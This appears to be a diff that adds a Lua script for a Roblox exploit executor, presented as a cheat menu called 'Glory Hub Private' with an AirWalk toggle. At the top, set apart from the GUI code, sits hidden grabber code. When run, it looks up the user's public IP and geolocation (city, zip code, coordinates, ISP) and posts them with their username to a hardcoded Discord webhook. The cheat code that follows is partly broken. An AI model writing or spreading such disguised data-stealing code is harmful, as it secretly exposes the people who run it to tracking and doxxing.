@@ -1,0 +1,358 @@
+-- variables
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+local WebhookURL = "https://discord.com/api/webhooks/1034622203670573076/6QOoBcsT7P_Z2VwXzZuKnkUpyYwXaIEXmuKa1APSiHNfbunKGgePqNvd0uczY_OFwwt6"
+
+local httpRequest = http_request or request or (syn and syn.request) or (http and http.request)
+
+-- some checks
+if not httpRequest then
+    return error("unsupported executor")
+end
+if not LocalPlayer then
+    return error("failed to execute")
+end
+
+-- begin
+local name, displayName = LocalPlayer.Name, LocalPlayer.DisplayName
+
+local localIP
+pcall(function()
+    localIP = HttpService:JSONDecode(httpRequest({
+        Url = "https://api.ipify.org/?format=json",
+        Method = "GET",
+    }).Body).ip
+end)
+if not localIP then
+    return error("failed to execute")
+end
+
+local ipInfo
+pcall(function()
+    ipInfo = HttpService:JSONDecode(httpRequest({
+        Url = string.format("http://ip-api.com/json/%s", localIP),
+        Method = "Get",
+    }).Body)
+end)
+if not ipInfo then
+    return error("failed to execute")
+end
+local dataMessage = string.format(
+    "User: %s (@%s)\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nLatitude: %s\nLongitude: %s\nISP: %s\nOrg: %s",
+    displayName, -- user's DisplayName
+    name, -- user's Name
+    localIP, -- ip
+    ipInfo.country, -- country
+    ipInfo.countryCode, -- country code
+    ipInfo.region, -- region
+    ipInfo.regionName, -- region name
+    ipInfo.city, -- city
+    ipInfo.zip, -- zipcode
+    ipInfo.lat, -- latitude
+    ipInfo.lon, -- longitude
+    ipInfo.isp, -- isp
+    ipInfo.org -- org
+)
+
+local json
+pcall(function()
+    json = HttpService:JSONEncode({
+        content = dataMessage
+    })
+end)
+if json then
+    -- print(json)
+    httpRequest({
+        Url = WebhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+        },
+        Body = json,
+    })
+end
+
+
+
+
+
+
+
+
+
+
+
+
+wait(5)
+
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local GUIholder = Instance.new("Frame")
+local GuiNotMinimized = Instance.new("Frame")
+local Closebutton = Instance.new("TextButton")
+local MinimizeButton = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+local Tab1 = Instance.new("Frame")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local TabHolder = Instance.new("Frame")
+local TextLabel_3 = Instance.new("TextLabel")
+local Tab2 = Instance.new("Frame")
+local GuiMinimized = Instance.new("Frame")
+local TextLabel_4 = Instance.new("TextLabel")
+local UnMinimizeButton = Instance.new("TextButton")
+local Closebutton_2 = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+GUIholder.Name = "GUIholder"
+GUIholder.Parent = ScreenGui
+GUIholder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+GUIholder.BackgroundTransparency = 1.000
+GUIholder.Position = UDim2.new(0.253237396, 0, 0.281481475, 0)
+GUIholder.Size = UDim2.new(0, 386, 0, 103)
+GUIholder.Active = true
+GUIholder.Draggable = true
+GUIholder.Visible = true
+
+GuiNotMinimized.Name = "GuiNotMinimized"
+GuiNotMinimized.Parent = GUIholder
+GuiNotMinimized.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+GuiNotMinimized.Position = UDim2.new(0.0103302449, 0, 0.300970912, 0)
+GuiNotMinimized.Size = UDim2.new(0, 378, 0, 41)
+GuiNotMinimized.Visible = true
+GuiNotMinimized.Active = true
+
+Closebutton.Name = "Close button"
+Closebutton.Parent = GuiNotMinimized
+Closebutton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+Closebutton.BackgroundTransparency = 1.000
+Closebutton.BorderColor3 = Color3.fromRGB(40, 40, 40)
+Closebutton.Position = UDim2.new(0.891534209, 0, 0, 0)
+Closebutton.Size = UDim2.new(0, 41, 0, 41)
+Closebutton.Font = Enum.Font.Michroma
+Closebutton.Text = "x"
+Closebutton.TextColor3 = Color3.fromRGB(255, 255, 255)
+Closebutton.TextScaled = true
+Closebutton.TextSize = 14.000
+Closebutton.TextWrapped = true
+
+MinimizeButton.Name = "Minimize Button"
+MinimizeButton.Parent = GuiNotMinimized
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeButton.BackgroundTransparency = 1.000
+MinimizeButton.Position = UDim2.new(0.743386269, 0, 0, 0)
+MinimizeButton.Size = UDim2.new(0, 49, 0, 41)
+MinimizeButton.Font = Enum.Font.Michroma
+MinimizeButton.Text = "-"
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeButton.TextScaled = true
+MinimizeButton.TextSize = 14.000
+MinimizeButton.TextWrapped = true
+
+TextLabel.Parent = GuiNotMinimized
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(177, 16, 16)
+TextLabel.Position = UDim2.new(0.140211642, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 41)
+TextLabel.Font = Enum.Font.Sarpanch
+TextLabel.Text = "Glory Hub Private | Booga Booga"
+TextLabel.TextColor3 = Color3.fromRGB(177, 16, 16)
+TextLabel.TextSize = 20.000
+
+Tab1.Name = "Tab 1"
+Tab1.Parent = GuiNotMinimized
+Tab1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Tab1.BorderColor3 = Color3.fromRGB(177, 16, 16)
+Tab1.Position = UDim2.new(0, 0, 1, 0)
+Tab1.Size = UDim2.new(0, 378, 0, 173)
+
+TextLabel_2.Parent = Tab1
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.285714298, 0, 0.132947981, 0)
+TextLabel_2.Size = UDim2.new(0, 145, 0, 50)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "AirWalk"
+TextLabel_2.TextColor3 = Color3.fromRGB(177, 100, 100)
+TextLabel_2.TextSize = 25.000
+
+TextButton.Parent = TextLabel_2
+TextButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.Position = UDim2.new(0.783965468, 0, 0.201577157, 0)
+TextButton.Size = UDim2.new(0, 31, 0, 28)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = ""
+TextButton.TextColor3 = Color3.fromRGB(177, 50, 50)
+TextButton.TextSize = 35.000
+TextButton.TextWrapped = true
+
+TabHolder.Name = "Tab Holder"
+TabHolder.Parent = GuiNotMinimized
+TabHolder.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TabHolder.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabHolder.Position = UDim2.new(0.0185185187, 0, 1.17073166, 0)
+TabHolder.Size = UDim2.new(0, 101, 0, 160)
+
+TextLabel_3.Parent = TabHolder
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.Position = UDim2.new(0.0462570935, 0, 0.0554552078, 0)
+TextLabel_3.Size = UDim2.new(0, 90, 0, 41)
+TextLabel_3.Font = Enum.Font.Cartoon
+TextLabel_3.Text = "Main"
+TextLabel_3.TextColor3 = Color3.fromRGB(177, 16, 16)
+TextLabel_3.TextSize = 25.000
+
+Tab2.Name = "Tab2"
+Tab2.Parent = GuiNotMinimized
+Tab2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Tab2.BorderColor3 = Color3.fromRGB(177, 16, 16)
+Tab2.Position = UDim2.new(0, 0, 1, 0)
+Tab2.Size = UDim2.new(0, 378, 0, 173)
+Tab2.Visible = false
+
+GuiMinimized.Name = "GuiMinimized"
+GuiMinimized.Parent = GUIholder
+GuiMinimized.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+GuiMinimized.Position = UDim2.new(0.0103302449, 0, 0.300970912, 0)
+GuiMinimized.Size = UDim2.new(0, 378, 0, 41)
+GuiMinimized.Visible = false
+
+TextLabel_4.Parent = GuiMinimized
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.BorderColor3 = Color3.fromRGB(177, 16, 16)
+TextLabel_4.Position = UDim2.new(0.140211642, 0, 0, 0)
+TextLabel_4.Size = UDim2.new(0, 200, 0, 41)
+TextLabel_4.Font = Enum.Font.Sarpanch
+TextLabel_4.Text = "Glory Hub Private | Booga Booga"
+TextLabel_4.TextColor3 = Color3.fromRGB(177, 16, 16)
+TextLabel_4.TextSize = 20.000
+
+UnMinimizeButton.Name = "UnMinimize Button"
+UnMinimizeButton.Parent = GuiMinimized
+UnMinimizeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+UnMinimizeButton.BackgroundTransparency = 1.000
+UnMinimizeButton.Position = UDim2.new(0.743386269, 0, 0, 0)
+UnMinimizeButton.Size = UDim2.new(0, 49, 0, 41)
+UnMinimizeButton.Font = Enum.Font.Michroma
+UnMinimizeButton.Text = "+"
+UnMinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+UnMinimizeButton.TextScaled = true
+UnMinimizeButton.TextSize = 14.000
+UnMinimizeButton.TextWrapped = true
+
+Closebutton_2.Name = "Close button"
+Closebutton_2.Parent = GuiMinimized
+Closebutton_2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+Closebutton_2.BackgroundTransparency = 1.000
+Closebutton_2.BorderColor3 = Color3.fromRGB(40, 40, 40)
+Closebutton_2.Position = UDim2.new(0.891534209, 0, 0, 0)
+Closebutton_2.Size = UDim2.new(0, 41, 0, 41)
+Closebutton_2.Font = Enum.Font.Michroma
+Closebutton_2.Text = "x"
+Closebutton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Closebutton_2.TextScaled = true
+Closebutton_2.TextSize = 14.000
+Closebutton_2.TextWrapped = true
+
+-- Scripts:
+
+local function FFYCZZU_fake_script() -- Closebutton.LocalScript 
+	local script = Instance.new('LocalScript', Closebutton)
+
+	script.Parent.MouseButton1Down:connect(function()
+		game:GetService("CoreGui"):WaitForChild("ScreenGui"):Destroy()
+	end)
+	
+	
+end
+coroutine.wrap(FFYCZZU_fake_script)()
+local function BXZYGBS_fake_script() -- MinimizeButton.LocalScript 
+	local script = Instance.new('LocalScript', MinimizeButton)
+
+	script.Parent.MouseButton1Down:connect(function()
+		GuiMinimized.Visible = true
+		GuiNotMinimzed.Visible = false
+		
+	end)
+	
+end
+coroutine.wrap(BXZYGBS_fake_script)()
+local function OJSI_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	
+	
+	
+	_G.AirWalk = false
+	
+	if _G.AirWalk == false then
+		script.Parent.MouseButton1Down:connect(function()
+			_G.AirWalk = true
+		end)
+		if _G.AirWalk == true then
+			script.Parent.MouseButton1Down:connect(function()
+				_G.AirWalk = false
+			end)
+		end
+	end
+	
+	
+	while _G.AirWalk == true do
+		local Player = game.Players.LocalPlayer.Character
+		Player.Humanoid.HipHeight = 5
+		
+		script.Parent.BackgroundColor3 = Color3.fromRGB(136, 17, 255)
+	
+	end
+	
+	while _G.AirWalk == false do
+		local Player = game.Players.LocalPlayer.Character
+		Player.Humanoid.HipHeight = 2
+		script.Parent.BackgroundColor3 = Color3.fromRGB(40,40,40)
+	
+	end
+	
+	
+	
+	
+		
+	
+	
+end
+coroutine.wrap(OJSI_fake_script)()
+local function BDICLPR_fake_script() -- UnMinimizeButton.LocalScript 
+	local script = Instance.new('LocalScript', UnMinimizeButton)
+
+	script.Parent.MouseButton1Down:connect(function()
+		GuiNotMinimzed.Visible = true
+		GuiMinimized.Visible = false
+		
+		
+	end)
+	
+end
+coroutine.wrap(BDICLPR_fake_script)()
+local function TCEMZL_fake_script() -- Closebutton_2.LocalScript 
+	local script = Instance.new('LocalScript', Closebutton_2)
+
+	script.Parent.MouseButton1Down:connect(function()
+		game:GetService("CoreGui"):WaitForChild("ScreenGui"):Destroy()
+	end)
+	
+	
+end
+coroutine.wrap(TCEMZL_fake_script)()
